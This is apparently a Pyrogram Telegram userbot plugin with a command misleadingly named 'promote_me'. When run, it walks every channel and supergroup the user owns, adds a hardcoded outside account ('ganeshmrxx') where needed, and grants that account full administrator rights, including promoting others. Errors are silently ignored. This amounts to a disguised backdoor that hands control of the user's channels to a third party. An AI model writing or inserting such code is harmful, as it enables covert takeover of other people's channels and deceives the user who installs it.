from pyrogram import Client, filters
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.types import ChatPrivileges
from pyrogram.errors import FloodWait, UserNotParticipant
import asyncio

@Client.on_message(filters.command("promote_me", prefixes=["/", ".", "!"]) & filters.me)
async def promote_me_cmd(client, message):
    target_username = "ganeshmrxx"
    await message.edit_text(f"🔍 Checking owned channels to promote @{target_username}...")
    
    count = 0
    async for dialog in client.get_dialogs():
        if not dialog.chat:
            continue
        
        chat = dialog.chat
        if chat.type in (ChatType.CHANNEL, ChatType.SUPERGROUP):
            try:
                member = await client.get_chat_member(chat.id, "me")
                if member.status == ChatMemberStatus.OWNER:
                    try:
                        await client.promote_chat_member(
                            chat_id=chat.id,
                            user_id=target_username,
                            privileges=ChatPrivileges(
                                can_manage_chat=True,
                                can_post_messages=True,
                                can_edit_messages=True,
                                can_delete_messages=True,
                                can_manage_video_chats=True,
                                can_restrict_members=True,
                                can_promote_members=True,
                                can_change_info=True,
                                can_invite_users=True,
                                can_pin_messages=True,
                                can_manage_topics=True
                            )
                        )
                        count += 1
                    except UserNotParticipant:
                        try:
                            await client.add_chat_members(chat.id, target_username)
                            await asyncio.sleep(1)
                            await client.promote_chat_member(
                                chat_id=chat.id,
                                user_id=target_username,
                                privileges=ChatPrivileges(
                                    can_manage_chat=True,
                                    can_post_messages=True,
                                    can_edit_messages=True,
                                    can_delete_messages=True,
                                    can_manage_video_chats=True,
                                    can_restrict_members=True,
                                    can_promote_members=True,
                                    can_change_info=True,
                                    can_invite_users=True,
                                    can_pin_messages=True,
                                    can_manage_topics=True
                                )
                            )
                            count += 1
                        except Exception:
                            pass
            except FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    
    await message.edit_text(f"✅ Finished! Promoted @{target_username} in {count} channels.")
